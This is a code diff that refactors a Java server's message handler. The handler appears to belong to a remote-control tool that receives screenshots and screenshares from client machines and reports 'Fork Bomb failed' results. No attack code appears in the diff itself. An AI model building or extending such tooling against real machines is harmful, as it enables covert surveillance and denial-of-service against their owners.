@@ -1,6 +1,5 @@
 package main.utils;
 
-import javafx.util.Pair;
 import main.network.ClientConnection;
 import main.network.Message;
 
@@ -11,12 +10,12 @@ import java.awt.event.WindowAdapter;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.InputStream;
-import java.util.ArrayList;
-import java.util.List;
+
+import static main.utils.ServerUtils.print;
+
 
 public class ServerMessageHandler {
 
-    public static final String SEPARATOR = "---------------------------------------";
     private static JFrame sharedScreen;
 
     public static void handleIncomingMessage(Message message, ClientConnection c) {
@@ -26,8 +25,7 @@ public class ServerMessageHandler {
                 receiveScreenshot(message);
                 break;
             case "print":
-                System.out.println(message.getArguments().get(0) +
-                        SEPARATOR);
+                print(message.getArguments().get(0));
                 break;
             case "screenshare":
                 receiveScreenShare(message, c);
@@ -35,18 +33,10 @@ public class ServerMessageHandler {
             case "bomb-fail":
                 System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
                 break;
-            case "commands":
-                printCommandList((ArrayList<Pair<String, String>>) message.getArguments().get(0));
         }
 
     }
 
-    static void printCommandList(List<Pair<String, String>> commands) {
-        for (Pair<String, String> c : commands) {
-            System.out.println("$ " + c.getKey() + " - " + c.getValue());
-        }
-        System.out.println(SEPARATOR);
-    }
 
     static void receiveScreenShare(Message message, ClientConnection c) {
         if (sharedScreen == null) {
